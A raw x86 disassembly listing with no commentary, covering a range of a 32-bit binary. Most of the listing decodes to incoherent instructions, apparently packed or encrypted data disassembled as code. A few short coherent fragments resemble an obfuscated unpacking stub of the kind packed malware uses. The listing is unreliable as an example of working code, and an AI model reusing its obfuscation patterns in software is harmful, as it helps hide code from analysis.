  4050af:	sub    cl,ah
  4050b1:	mov    esi,0x3d9e8deb
  4050b6:	inc    esi
  4050b7:	dec    esi
  4050b8:	bound  ecx,QWORD PTR [ecx-0x4ad77c1c]
  4050be:	repz (bad) 
  4050c1:	int    0x6d
  4050c3:	inc    edi
  4050c4:	in     al,0x63
  4050c6:	pcmpgtd mm7,QWORD PTR [edi+0x9aa6e44]
  4050cd:	sti    
  4050ce:	ja     0x4050f7
  4050d0:	inc    edi
  4050d1:	(bad)  
  4050d2:	in     eax,dx
  4050d3:	xor    DWORD PTR [ecx],ebx
  4050d5:	add    eax,0x78f295ba
  4050da:	rol    BYTE PTR [esi+0x5cb715f],cl
  4050e0:	mov    eax,ds:0x84b799d6
  4050e5:	in     eax,0xaf
  4050e7:	jmp    0xc8e8f0b
  4050ec:	and    al,0x1a
  4050ee:	mov    ch,0xa2
  4050f0:	xor    edx,DWORD PTR fs:[esi+0x2bf67c7d]
  4050f7:	pop    ds
  4050f8:	mov    bh,0xb1
  4050fa:	mov    esp,0x53692154
  4050ff:	push   DWORD PTR [edi]
  405101:	xchg   esp,eax
  405102:	enter  0xaecf,0x93
  405106:	pop    ss
  405107:	test   BYTE PTR [ebx],bh
  405109:	jns    0x405117
  40510b:	imul   BYTE PTR [edi-0x26]
  40510e:	hlt    
  40510f:	xor    esp,eax
  405111:	mov    ebp,0x4357c738
  405116:	or     eax,0x3f52e28b
  40511b:	pop    eax
  40511c:	addr16 std 
  40511e:	or     edi,ebx
  405120:	and    eax,0xe5cbf08b
  405125:	mov    ch,0x8c
  405127:	pop    edi
  405128:	push   ss
  405129:	mov    ds:0xcdbc0c24,eax
  40512e:	add    ebp,DWORD PTR [edx-0x56420f75]
  405134:	sti    
  405135:	cmp    BYTE PTR [esi-0x188d8bc4],ch
  40513b:	xchg   ecx,eax
  40513c:	pop    ds
  40513d:	adc    DWORD PTR [edi],eax
  40513f:	fdivp  st(6),st
  405141:	mov    dh,BYTE PTR [ebp-0x1ea361d0]
  405147:	sti    
  405148:	imul   DWORD PTR [esi]
  40514a:	sub    ebp,ecx
  40514c:	(bad)  
  40514d:	jno    0x4050e2
  40514f:	imul   edi,ebx
  405152:	mov    ebx,DWORD PTR [ebp-0x18]
  405155:	xor    ebx,eax
  405157:	sub    edx,ecx
  405159:	lea    edi,[edi+ebx*1+0x32729b]
  405160:	jmp    0x405463
  405165:	pusha  
  405166:	das    
  405167:	sti    
  405168:	pop    eax
  405169:	push   ecx
  40516a:	push   0x65ca3761
  40516f:	out    0x76,eax
  405171:	fistp  WORD PTR [edx+0x19]
  405174:	dec    edx
  405175:	imul   BYTE PTR [esi+edi*2]
  405178:	jle    0x4051d2
  40517a:	jl     0x4051fa
  40517c:	jle    0x4051b9
  40517e:	pop    esi
  40517f:	cli    
  405180:	add    al,ah
  405182:	pop    edx
  405183:	mov    esp,0x38b238ea
  405188:	inc    ecx
  405189:	and    BYTE PTR [ebp*2+0x7448833c],dl
  405190:	jne    0x405210
  405192:	addr16 mov esp,0x9e109094
  405198:	cmp    DWORD PTR [edx-0x9f942c9],ecx
  40519e:	and    eax,0xa290da7a
  4051a3:	adc    eax,0xd6f2ef93
  4051a8:	sub    DWORD PTR [edx],edi
  4051aa:	lea    ecx,[edi-0xc2cd825]
  4051b0:	mov    al,ds:0xab27ea0f
  4051b5:	cmp    BYTE PTR [ebp+0x7241af74],ch
  4051bb:	stc    
  4051bc:	adc    eax,0x6db9278e
  4051c1:	add    ebx,DWORD PTR [ebp+esi*8-0x47]
  4051c5:	or     DWORD PTR [edi-0x12],0xffffff82
  4051c9:	not    bh
  4051cb:	mov    fs,WORD PTR [edi+0x5]
  4051ce:	lahf   
  4051cf:	ror    ebx,0x88
  4051d2:	mov    dh,0xfb
  4051d4:	cmp    BYTE PTR [edi],0xea
  4051d7:	bound  ecx,QWORD PTR [ebx]
  4051d9:	mov    ch,0xf0
  4051db:	loopne 0x405194
  4051dd:	adc    dl,cl
  4051df:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4051e0:	mov    BYTE PTR [eax-0x3db3a746],al
  4051e6:	es push 0xd15fcb48
  4051ec:	jns    0x405172
  4051ee:	pop    eax
  4051ef:	dec    edx
  4051f0:	dec    edi
  4051f1:	inc    edi
  4051f2:	in     eax,dx
  4051f3:	fwait
  4051f4:	les    eax,FWORD PTR [ecx+0x19074317]
  4051fa:	mov    bh,0xf7
  4051fc:	call   0xf889:0xb550613
  405203:	or     cl,BYTE PTR [edx+0x515dd635]
  405209:	jmp    0xab0a0b47
  40520e:	push   ecx
  40520f:	outs   dx,DWORD PTR ds:[esi]
  405210:	pop    ss
  405211:	fst    QWORD PTR [eax+0x34be680b]
  405217:	sub    al,0xf
  405219:	push   esi
  40521a:	cmp    edx,0x80dd4c7a
  405220:	imul   edx,DWORD PTR [eax-0x40d2805f],0xfc410083
  40522a:	mov    esi,0x6b55568c
  40522f:	retf   0x6ecf
  405232:	mov    WORD PTR [ebx],es
  405234:	mov    WORD PTR [edx-0x61ef6096],gs
  40523a:	fisttp WORD PTR [ebx]
  40523c:	fs stos BYTE PTR es:[edi],al
  40523e:	mov    ebx,0xa5e99bae
  405243:	push   ebx
  405244:	rol    DWORD PTR [ebp+eax*2-0x7c897ee0],cl
  40524b:	dec    ebp
  40524c:	jg     0x4051d3
  40524e:	ret    0xbbfc
  405251:	stos   BYTE PTR es:[edi],al
  405252:	into   
  405253:	enter  0x2ba5,0x1c
  405257:	shl    DWORD PTR [ebx+eax*4-0x13],0x7f
  40525c:	mov    edx,0x25d10c1
  405261:	adc    cl,cl
  405263:	stc    
  405264:	sbb    al,0x16
  405266:	pusha  
  405267:	inc    esp
  405268:	xor    DWORD PTR [ebx+0x1feabdc5],0xffffffad
  40526f:	test   bl,bh
  405271:	xor    dh,BYTE PTR [ebx-0x6e7eca3c]
  405277:	gs pop edi
  405279:	scas   eax,DWORD PTR es:[edi]
  40527a:	imul   ebx,eax,0x6fd8f159
  405280:	inc    edi
  405281:	and    al,0x53
  405283:	sbb    edi,esi
  405285:	xchg   esp,eax
  405286:	fstp   DWORD PTR [edx]
  405288:	and    BYTE PTR [ebx+0x11],bh
  40528b:	adc    ebx,ecx
  40528d:	iret   
  40528e:	sbb    bl,al
  405290:	pop    ebp
  405291:	gs jno 0x40530e
  405294:	inc    edx
  405295:	cmp    eax,0x3c168c64
  40529a:	jg     0x40530a
  40529c:	loope  0x40525a
  40529e:	and    BYTE PTR [ecx],al
  4052a0:	repz ss in eax,0xa8
  4052a4:	loopne 0x4052f6
  4052a6:	ins    BYTE PTR es:[edi],dx
  4052a7:	and    BYTE PTR [edi+0x0],ch
  4052aa:	repnz pop ds
  4052ac:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4052ad:	std    
  4052ae:	leave  
  4052af:	mov    ch,0x27
  4052b1:	add    dl,ah
  4052b3:	pop    DWORD PTR [edx+0x7b424d50]
  4052b9:	inc    edi
  4052ba:	and    eax,0xbc2169e3
  4052bf:	in     al,0xe5
  4052c1:	js     0x40529c
  4052c3:	shld   DWORD PTR [eax+0xf78143f],esi,0x2a
  4052cb:	aam    0xcc
  4052cd:	push   edx
  4052ce:	jns    0x40534a
  4052d0:	mov    WORD PTR ds:0x58289eea,?
  4052d6:	mov    al,0x39
  4052d8:	iret   
  4052d9:	jp     0x40531a
  4052db:	leave  
  4052dc:	cs sub eax,0x89003568
  4052e2:	pop    esi
  4052e3:	out    dx,al
  4052e4:	fwait
  4052e5:	mov    bh,0xf7
  4052e7:	and    bl,BYTE PTR [ebx-0x65de3c44]
  4052ed:	in     al,dx
  4052ee:	mov    eax,ds:0xa16b1f8e
  4052f3:	fs int 0xbc
  4052f6:	pop    ds
  4052f7:	jnp    0x405355
  4052f9:	fwait
  4052fa:	scas   eax,DWORD PTR es:[edi]
  4052fb:	pop    edi
  4052fc:	hlt    
  4052fd:	cmp    al,0xd9
  4052ff:	add    esp,eax
  405301:	mov    eax,0xe0f3b509
  405306:	add    eax,0xff38a990
  40530b:	fisttp WORD PTR [edx+esi*4-0x2eff2ad1]
  405312:	repz add bh,ch
  405315:	jbe    0x405379
  405317:	and    al,0xab
  405319:	dec    ecx
  40531a:	cmp    esp,DWORD PTR [edx+0x5dc87c49]
  405320:	call   0x53e18b42
  405325:	icebp  
  405326:	push   ebp
  405327:	in     eax,0xf9
  405329:	cmp    edx,DWORD PTR [eax]
  40532b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40532c:	cdq    
  40532d:	ds cld 
  40532f:	xchg   esi,eax
  405330:	popa   
  405331:	inc    eax
  405332:	pop    ebp
  405333:	aad    0x2d
  405335:	push   ds
  405336:	int    0x78
  405338:	cmovne esp,DWORD PTR [ebp-0x2160c36c]
  40533f:	repz jmp 0x3052:0xdb77c598
  405347:	test   al,0x29
  405349:	adc    eax,0xc226a884
  40534e:	in     al,0xe
  405350:	inc    ebp
  405351:	push   ebp
  405352:	xchg   esp,eax
  405353:	mov    BYTE PTR [ebp-0x50],ch
  405356:	adc    DWORD PTR [esi+0x2a],ebp
  405359:	lds    edi,FWORD PTR [ecx]
  40535b:	mov    cl,0x37
  40535d:	test   eax,0xc4aa8f6
  405362:	and    al,0x68
  405364:	test   BYTE PTR [ecx-0x31],ch
  405367:	aam    0x1e
  405369:	sbb    ecx,DWORD PTR [edx+0x1cc93114]
  40536f:	push   cs
  405370:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  405372:	stos   BYTE PTR es:[edi],al
  405373:	shl    BYTE PTR [edx-0x25],cl
  405376:	inc    edi
  405377:	dec    esp
  405378:	jae    0x4053f5
  40537a:	out    0xe4,eax
  40537c:	sbb    DWORD PTR [eax+ebx*1+0x3a],0xc1a44078
  405384:	mov    ds:0xf63ccd6a,eax
  405389:	in     al,dx
  40538a:	sub    al,0x78
  40538c:	lods   eax,DWORD PTR ds:[esi]
  40538d:	xor    DWORD PTR ds:0xa4649acc,esi
  405393:	add    al,0xa9
  405395:	add    al,0x11
  405397:	lds    esi,FWORD PTR [ebp-0x47]
  40539a:	cmp    dl,ch
  40539c:	nop
  40539d:	dec    edi
  40539e:	mov    esi,0x48f6ea22
  4053a3:	mov    ebx,0xc1b23167
  4053a8:	mov    ds:0x58efddc8,al
  4053ad:	push   ebp
  4053ae:	imul   ch
  4053b0:	xor    al,0x17
  4053b2:	(bad)  
  4053b3:	mov    ds:0x81537141,al
  4053b8:	dec    ecx
  4053b9:	or     dh,bh
  4053bb:	int3   
  4053bc:	in     al,dx
  4053bd:	fwait
  4053be:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4053bf:	jbe    0x40537d
  4053c1:	inc    esp
  4053c2:	push   cs
  4053c3:	outs   dx,DWORD PTR ds:[esi]
  4053c4:	sbb    BYTE PTR [edi+0x8bf1edc],bh
  4053ca:	sti    
  4053cb:	loope  0x4053e7
  4053cd:	call   0xe94a:0xfe6c24ec
  4053d4:	cmp    DWORD PTR [edi-0x68],edx
  4053d7:	test   al,0x5a
  4053d9:	test   edx,edx
  4053db:	aam    0xca
  4053dd:	xchg   esp,eax
  4053de:	mov    al,ds:0x613c1af4
  4053e3:	push   ecx
  4053e4:	int    0x41
  4053e6:	(bad)  
  4053e7:	and    eax,0x736843ed
  4053ec:	add    ah,bl
  4053ee:	xchg   ebp,eax
  4053ef:	mov    edi,0x686e62f5
  4053f4:	jbe    0x4053fc
  4053f6:	cs push ebx
  4053f8:	fnstenv [ecx+0x1e501289]
  4053fe:	xor    ebp,DWORD PTR [ebx+0x1d]
  405401:	mov    fs,WORD PTR [ebx]
  405403:	ds push ecx
  405405:	xchg   ebx,eax
  405406:	ror    BYTE PTR [edi],cl
  405408:	pusha  
  405409:	dec    esp
  40540a:	or     esi,DWORD PTR [eax-0x1ea6051a]
  405410:	das    
  405411:	or     eax,edi
  405413:	pushf  
  405414:	fsubp  st(1),st
  405416:	and    al,0xa5
  405418:	fld    st(4)
  40541a:	push   edx
  40541b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40541c:	xor    al,BYTE PTR [eax+0x45]
  40541f:	mov    ebx,DWORD PTR [ebx]
  405421:	push   es
  405422:	fs adc al,0x51
  405425:	or     esi,0x6
  405428:	push   ebx
  405429:	cld    
  40542a:	or     al,0x26
  40542c:	xor    DWORD PTR [ecx+eax*4+0x1cc9170c],ebx
  405433:	in     al,0x0
  405435:	jns    0x405496
  405437:	add    esp,0xe10a818e
  40543d:	mov    edx,0xac72b731
  405442:	(bad)  
  405443:	aas    
  405444:	ja     0x405449
  405446:	in     eax,0x98
  405448:	in     al,0x25
  40544a:	dec    ecx
  40544b:	scas   eax,DWORD PTR es:[edi]
  40544c:	and    ah,ah
  40544e:	in     eax,0xe8
  405450:	(bad)  
  405451:	mov    ch,0xa0
  405453:	cmp    eax,0x3edaffac
  405458:	push   edi
  405459:	xor    DWORD PTR [edx],0xef0cf4be
  40545f:	es js  0x405490
  405462:	sbb    eax,0x860ffa3b
  405467:	push   ebp
  405468:	idiv   bh
  40546a:	dec    DWORD PTR [ebx+0x7d8bf455]
  405470:	fsub   st(1),st
  405472:	inc    BYTE PTR [edx]
  405474:	add    BYTE PTR [eax],al
  405476:	outs   dx,DWORD PTR ds:[esi]
  405477:	fisttp QWORD PTR [esi+0x6f6d8cef]
  40547d:	pop    ebp
  40547e:	fmul   QWORD PTR [edi-0x1bd70448]
  405484:	xor    BYTE PTR [eax+edx*8],al
  405487:	sub    edi,DWORD PTR [esi+0x7e]
  40548a:	pop    eax
  40548b:	jl     0x40550b
  40548d:	jle    0x4054b9
  40548f:	sbb    eax,DWORD PTR [eax+eiz*2+0x49]
  405493:	repz inc esi
  405495:	ss popa 
  405497:	call   0x2792:0x74f133b7
  40549e:	je     0x40551a
  4054a0:	sbb    BYTE PTR [edx*8-0x60963d00],bh
  4054a7:	sub    DWORD PTR [ebx],ebx
  4054a9:	mov    bl,0x42
  4054ab:	sub    BYTE PTR [ebx+eax*8],bl
  4054ae:	outs   dx,BYTE PTR ds:[esi]
  4054af:	hlt    
  4054b0:	dec    edi
  4054b1:	stos   BYTE PTR es:[edi],al
  4054b2:	jo     0x40544f
  4054b4:	aam    0x72
  4054b6:	fldcw  WORD PTR ds:0xd933661e
  4054bc:	pop    eax
  4054bd:	jecxz  0x40545e
  4054bf:	xchg   esp,eax
  4054c0:	mov    al,0x82
  4054c2:	jge    0x4054e9
  4054c4:	jecxz  0x40544a
  4054c6:	pop    ss
  4054c7:	ret    
  4054c8:	loop   0x405538
  4054ca:	lahf   
  4054cb:	jle    0x4054b0
  4054cd:	push   ebp
  4054ce:	sbb    al,0x62
  4054d0:	mov    ebp,eax
  4054d2:	leave  
  4054d3:	dec    edx
  4054d4:	stos   BYTE PTR es:[edi],al
  4054d5:	stc    
  4054d6:	retf   
  4054d7:	inc    ecx
  4054d8:	xchg   edi,eax
  4054d9:	sub    al,0x2
  4054db:	repnz cmp ecx,DWORD PTR [edx-0x23]
  4054df:	mov    edi,0xa91b2ef
  4054e4:	mov    ecx,0x6a76503c
  4054e9:	icebp  
  4054ea:	mov    BYTE PTR [eax],ch
  4054ec:	cmp    eax,0x5df6a9de
  4054f1:	and    al,0x4a
  4054f3:	pusha  
  4054f4:	mov    ecx,0xf5b04df4
  4054f9:	add    dh,bl
  4054fb:	push   ecx
  4054fc:	mov    dl,0x77
  4054fe:	pop    ebp
  4054ff:	mov    bl,0x3b
  405501:	std    
  405502:	pushf  
  405503:	fadd   DWORD PTR ds:0x3f65049a
  405509:	ret    
  40550a:	in     eax,dx
  40550b:	inc    edx
  40550c:	adc    cl,BYTE PTR [edx+esi*4-0x7089af79]
  405513:	adc    al,0xef
  405515:	jns    0x4054e9
  405517:	ja     0x40552d
  405519:	or     al,0xdb
  40551b:	ret    
  40551c:	mov    eax,ds:0x6975b55a
  405521:	test   eax,0x37a158ee
  405526:	(bad)  
  405529:	push   edx
  40552a:	pop    ecx
  40552b:	push   eax
  40552c:	pop    ebx
  40552d:	(bad)  
  40552f:	outs   dx,DWORD PTR ds:[esi]
  405530:	xchg   esi,eax
  405531:	dec    ebx
  405532:	xlat   BYTE PTR ds:[ebx]
  405533:	sbb    edi,DWORD PTR [edi+0x1ac13cdd]
  405539:	data16 jb 0x4054ed
  40553c:	rcl    dl,0xaa
  40553f:	or     esp,ebx
  405541:	and    al,0xfe
  405543:	cdq    
  405544:	call   0x538944c4
  405549:	pop    ds
  40554a:	dec    edi
  40554b:	fnstcw WORD PTR [ecx+0x4]
  40554e:	add    cl,BYTE PTR [ebp-0x13]
  405551:	push   esi
  405552:	out    dx,al
  405553:	or     eax,0xf2e31e7c
  405558:	icebp  
  405559:	sub    eax,0x73fb43a
  40555e:	repz xor DWORD PTR [esi+0x6daa654f],eax
  405565:	in     eax,0x66
  405567:	bound  esp,QWORD PTR [ebx]
  405569:	and    al,0xcb
  40556b:	mov    eax,DWORD PTR [esi+0x17876d7d]
  405571:	je     0x405579
  405573:	push   edx
  405574:	mov    bh,0x5d
  405576:	ret    0xb0b0
  405579:	dec    esp
  40557a:	sub    BYTE PTR [esi],ch
  40557c:	sbb    dl,bh
  40557e:	xchg   DWORD PTR [esi],ebx
  405580:	ins    DWORD PTR es:[edi],dx
  405581:	loopne 0x4055c8
  405583:	mov    ebx,0x1dc84760
  405588:	enter  0x4e99,0x8c
  40558c:	(bad)  
  40558d:	xor    eax,0xfc0c88f5
  405592:	rcl    DWORD PTR [esi+0x59],cl
  405595:	imul   edx,ebp,0x3d
  405598:	cmp    dh,BYTE PTR [ebp-0x5d]
  40559b:	and    eax,0xce26d4a4
  4055a0:	mov    ds:0x22df70c7,al
  4055a5:	push   ebp
  4055a6:	lods   al,BYTE PTR ds:[esi]
  4055a7:	das    
  4055a8:	call   0x6234:0x3b99bb2a
  4055af:	sub    eax,0x462cae22
  4055b4:	(bad)  
  4055b5:	(bad)  
  4055b6:	je     0x405574
  4055b8:	mov    bh,0xd6
  4055ba:	dec    ebp
  4055bb:	inc    eax
  4055bc:	pusha  
  4055bd:	sar    DWORD PTR [edi+eiz*4+0x1839e8a6],cl
  4055c4:	xor    bh,BYTE PTR [edx]
  4055c6:	icebp  
  4055c7:	(bad)  
  4055c8:	into   
  4055c9:	add    BYTE PTR [ecx],cl
  4055cb:	hlt    
  4055cc:	scas   al,BYTE PTR es:[edi]
  4055cd:	mov    dl,0x73
  4055cf:	mov    eax,0x93006f03
  4055d4:	leave  
  4055d5:	jnp    0x405581
  4055d7:	push   ebx
  4055d8:	dec    esi
  4055d9:	mov    bh,0x66
  4055db:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4055dc:	and    BYTE PTR [edx],bh
  4055de:	lock mov edi,DWORD PTR [edx-0x643cd254]
  4055e5:	jae    0x4055ae
  4055e7:	mov    edx,0xf375dfd4
  4055ec:	sub    eax,0x8ac069a6
  4055f1:	pop    eax
  4055f2:	mov    ds,WORD PTR [ebp+0x74]
  4055f5:	out    0xc2,al
  4055f7:	add    al,0x35
  4055f9:	jge    0x40559e
  4055fb:	sub    al,0x5c
  4055fd:	push   edx
  4055fe:	mov    bl,0xaa
  405600:	leave  
  405601:	dec    eax
  405602:	test   eax,0x4020a72a
  405607:	fiadd  WORD PTR [edx-0x70]
  40560a:	iret   
  40560b:	ret    
  40560c:	jmp    0x40564d
  40560e:	mov    esp,0x6dcf9b9d
  405613:	mov    esi,0x3983f338
  405618:	xchg   edx,eax
  405619:	cmp    al,0xa3
  40561b:	push   cs
  40561c:	mov    bh,0x59
  40561e:	into   
  40561f:	lods   al,BYTE PTR ds:[esi]
  405620:	push   0x8
  405622:	popf   
  405623:	xlat   BYTE PTR ds:[ebx]
  405624:	pop    ss
  405625:	jle    0x4055a8
  405627:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  405628:	in     eax,0xfb
  40562a:	mov    ebx,0xf133b13d
  40562f:	pop    ss
  405630:	ror    BYTE PTR fs:[ebx-0x14],0x78
  405635:	je     0x405657
  405637:	and    DWORD PTR [esi],esi
  405639:	mov    WORD PTR [ecx],fs
  40563b:	sbb    eax,DWORD PTR cs:0xb7ff2a32
  405642:	mov    ds:0x9ffe7ec5,al
  405647:	pop    es
  405648:	nop
  405649:	xchg   esi,eax
  40564a:	int3   
  40564b:	push   ebx
  40564c:	scas   eax,DWORD PTR es:[edi]
  40564d:	sbb    ebx,eax
  40564f:	clc    
  405650:	jle    0x4055de
  405652:	(bad)  
  405653:	repz (bad) 
  405655:	push   ss
  405656:	xor    bl,BYTE PTR [ebx-0x168efd2f]
  40565c:	ins    BYTE PTR es:[edi],dx
  40565d:	cli    
  40565e:	cmp    bl,al
  405660:	mov    edi,0x5222dc74
  405665:	push   ds
  405666:	std    
  405667:	or     al,0xbf
  405669:	xchg   eax,ecx
  40566b:	sbb    ecx,DWORD PTR [edx+0x2f219498]
  405671:	push   es
  405672:	test   BYTE PTR [edi],al
  405674:	xor    bl,BYTE PTR [ebx]
  405676:	or     eax,0xd762cbbc
  40567b:	cmp    BYTE PTR [esi+0x39090624],0x5d
  405682:	shl    edi,1
  405684:	adc    al,0x70
  405686:	sub    eax,0xc75521ec
  40568b:	cmp    esp,DWORD PTR [eax+ecx*2-0x3b28e106]
  405692:	repz and dh,0x8
  405696:	xchg   ebp,eax
  405697:	mov    bl,0xa5
  405699:	ror    BYTE PTR [ecx],0xeb
  40569c:	ror    DWORD PTR [ebx+0x4b],1
  40569f:	stos   BYTE PTR es:[edi],al
  4056a0:	xchg   edi,eax
  4056a1:	jl     0x40569b
  4056a3:	into   
  4056a4:	push   ecx
  4056a5:	out    0x43,eax
  4056a7:	pushf  
  4056a8:	mov    dh,0xe7
  4056aa:	mov    ecx,ebp
  4056ac:	pushf  
  4056ad:	sub    DWORD PTR [ecx],0xffffffed
  4056b0:	adc    eax,0xeb23693e
  4056b5:	sbb    al,0xc7
  4056b7:	mov    al,0x70
  4056b9:	or     ecx,DWORD PTR [esi+0x2075bc0]
  4056bf:	rol    BYTE PTR [ebp-0x2166ed],cl
  4056c5:	outs   dx,DWORD PTR ds:[esi]
  4056c6:	fcmove st,st(1)
  4056c8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4056c9:	add    eax,0x88a657e0
  4056ce:	in     eax,0x71
  4056d0:	xchg   edi,eax
  4056d1:	dec    esp
  4056d2:	dec    edx
  4056d3:	ret    0xb4ed
  4056d6:	and    dl,bl
  4056d8:	int3   
  4056d9:	inc    ebp
  4056da:	(bad)  
  4056db:	rol    BYTE PTR [edx],1
  4056dd:	sub    eax,0x34e2b8ef
  4056e2:	push   ds
  4056e3:	ins    BYTE PTR es:[edi],dx
  4056e4:	repz sbb bl,BYTE PTR [esi-0xeea5057]
  4056eb:	std    
  4056ec:	xor    al,0x71
  4056ee:	jnp    0x4056b3
  4056f0:	retf   0xbb59
  4056f3:	mov    al,ds:0xea0f37cc
  4056f8:	outs   dx,DWORD PTR ds:[esi]
  4056f9:	inc    eax
  4056fa:	imul   edx,ebx,0xeb5c5a8c
  405700:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  405701:	das    
  405702:	mov    ds:0xd3945d8b,eax
  405707:	mov    dl,0xdb
  405709:	lock ss repnz inc esp
  40570d:	mov    cs,esi
  40570f:	int3   
  405710:	icebp  
  405711:	sub    esi,edx
  405713:	or     edx,eax
  405715:	aad    0xa3
  405717:	les    esp,FWORD PTR [edx+ebp*2-0x6264f76c]
  40571e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40571f:	and    al,0xae
  405721:	add    al,BYTE PTR [ebx+0x32]
  405724:	enter  0x9285,0x9c
  405728:	(bad)  
  405729:	adc    esp,DWORD PTR [ebx-0x23f93841]
  40572f:	(bad)  
  405730:	mov    dh,0x75
  405732:	sbb    BYTE PTR [ebx-0x6174e0e2],0xfb
  405739:	fld    DWORD PTR [edx]
  40573b:	jecxz  0x405713
  40573d:	or     DWORD PTR [eax+ebx*8],ecx
  405740:	jnp    0x405758
  405742:	add    BYTE PTR [esi],0xed
  405745:	cld    
  405746:	es inc ebx
  405748:	test   BYTE PTR [ebp+0x78],bh
  40574b:	push   esp
  40574c:	add    al,0x90
  40574e:	xchg   ecx,eax
  40574f:	popa   
  405750:	cli    
  405751:	mov    WORD PTR [ecx+0x1bbe3047],cs
  405757:	and    al,BYTE PTR [eax]
  405759:	fldenv [esi+0x19]
  40575c:	mov    dl,0xae
  40575e:	aaa    
  40575f:	mov    cl,0x50
  405761:	cld    
  405762:	push   eax
  405763:	call   0xb1259a05
  405768:	mov    esp,DWORD PTR [ebp-0x72ccb4c7]
  40576e:	sub    DWORD PTR [ebp-0x390561c7],0x33
  405775:	rol    BYTE PTR [ebx],1
  405777:	ror    DWORD PTR [edi],1
  405779:	scas   eax,DWORD PTR es:[edi]
  40577a:	xlat   BYTE PTR ds:[ebx]
  40577b:	mov    edi,DWORD PTR [ebp-0x18]
  40577e:	xor    edi,eax
  405780:	add    edx,edi
  405782:	mov    edi,DWORD PTR [ebp-0x8]
  405785:	lea    edx,[edx+edi*1+0x32729b]
  40578c:	mov    DWORD PTR [ebp-0x8],edx
  40578f:	mov    edx,DWORD PTR [ebp-0x20]
  405792:	xor    edx,eax
  405794:	mov    edi,0xffcd8d65
  405799:	sub    edi,edx
  40579b:	add    edi,DWORD PTR [ebp-0x10]
  40579e:	mov    edx,DWORD PTR [ebp-0x20]
  4057a1:	mov    ebx,DWORD PTR [ebp-0x8]
  4057a4:	xor    edx,eax
  4057a6:	add    edx,ecx
  4057a8:	imul   edx,ebx
  4057ab:	cmp    edx,edi
  4057ad:	jbe    0x4038ea
  4057b3:	pop    ebx
  4057b4:	pop    edi
  4057b5:	leave  
  4057b6:	ret    0x8
  4057b9:	push   ebp
  4057ba:	mov    ebp,esp
  4057bc:	push   ecx
  4057bd:	mov    ecx,DWORD PTR [ebp+0x8]
  4057c0:	and    eax,DWORD PTR ds:0x43389b
  4057c6:	mov    eax,0x7510854
  4057cb:	xor    DWORD PTR ds:0x4337a3,0x433783
  4057d5:	xor    ecx,eax
  4057d7:	not    DWORD PTR ds:0x4337df
  4057dd:	add    ecx,0x32729b
  4057e3:	jmp    0x405b32
  4057e8:	scas   eax,DWORD PTR es:[edi]
  4057e9:	inc    BYTE PTR [ebp-0x39]
  4057ec:	jne    0x4057b3
  4057ee:	lods   eax,DWORD PTR ds:[esi]
  4057ef:	jbe    0x4057a1
  4057f1:	loopne 0x4057f0
  4057f3:	mov    al,0x88
  4057f5:	cwde   
  4057f6:	stos   BYTE PTR es:[edi],al
  4057f7:	mov    al,ds:0x7e7e363a
  4057fc:	sub    al,0x7d
  4057fe:	jle    0x40587e
  405800:	sbb    al,0xc9
  405802:	jb     0x40579d
  405804:	jmp    0xe41d:0xe8196e57
  40580b:	mov    dh,0xf6
  40580d:	mov    eax,0x558830f5
  405812:	in     eax,dx
  405813:	push   edx
  405814:	lahf   
  405815:	push   eax
  405816:	pop    ds
  405817:	cld    
  405818:	add    esi,DWORD PTR [ebx+0x2905a947]
  40581e:	dec    esp
  40581f:	add    DWORD PTR [eax+eiz*8+0x5447724d],esi
  405826:	out    0x80,al
  405828:	xchg   ebx,eax
  405829:	lods   eax,DWORD PTR ds:[esi]
  40582a:	inc    eax
  40582b:	pop    esi
  40582c:	daa    
  40582d:	xor    ebx,eax
  40582f:	cli    
  405830:	xchg   DWORD PTR [ecx+0x2d956413],ecx
  405836:	and    DWORD PTR [edx-0x7e],ebx
  405839:	pop    ebp
  40583a:	test   eax,0x50e05c37
  40583f:	cmp    eax,0x30a65079
  405844:	(bad)  
  405845:	rcl    BYTE PTR [ebx],1
  405847:	dec    ecx
  405848:	nop
  405849:	in     eax,0xcb
  40584b:	jne    0x405864
  40584d:	mov    eax,DWORD PTR [ebx+esi*4]
  405850:	in     al,0xb3
  405852:	arpl   WORD PTR [ebp-0x6b037341],cx
  405858:	mov    dl,0x21
  40585a:	lock pusha 
  40585c:	mov    BYTE PTR [ebp-0x3c],0x81
  405860:	and    BYTE PTR [edi+0x4728ec3d],0x9a
  405867:	fwait
  405868:	outs   dx,DWORD PTR ds:[esi]
  405869:	mov    BYTE PTR [ebx-0x4d0c0f19],0xe6
  405870:	pop    edi
  405871:	xchg   esp,eax
  405872:	inc    ebp
  405873:	jecxz  0x4058d2
  405875:	repnz cdq 
  405877:	popf   
  405878:	fisttp QWORD PTR [edx]
  40587a:	and    DWORD PTR [esi+0x32026a15],ebp
  405880:	or     dh,BYTE PTR [esi+0x24205088]
  405886:	sbb    eax,0xb189c8f1
  40588b:	mov    edi,0xd93a7d5b
  405890:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  405891:	xchg   ebp,eax
  405892:	or     ecx,DWORD PTR [edx+0x5e]
  405895:	mov    ah,0x9f
  405897:	xchg   esp,eax
  405898:	mov    eax,DWORD PTR fs:[ecx+0x38]
  40589c:	push   esi
  40589d:	mul    ebx
  40589f:	pop    es
  4058a0:	arpl   WORD PTR [esi+0x73],di
  4058a3:	xchg   BYTE PTR [edx],bh
  4058a5:	inc    edi
  4058a6:	pop    esp
  4058a7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4058a9:	aad    0xc8
  4058ab:	xchg   BYTE PTR [edi],bl
  4058ad:	stc    
  4058ae:	jbe    0x405877
  4058b0:	jnp    0x405907
  4058b2:	sar    DWORD PTR [ebp+ecx*4-0x5a9389ec],0x2c
  4058ba:	mov    eax,ds:0x6d3c6531
  4058bf:	inc    ebx
  4058c0:	ins    BYTE PTR es:[edi],dx
  4058c1:	mov    eax,0x7d9b217f
  4058c6:	aas    
  4058c7:	and    al,0x9a
  4058c9:	inc    esi
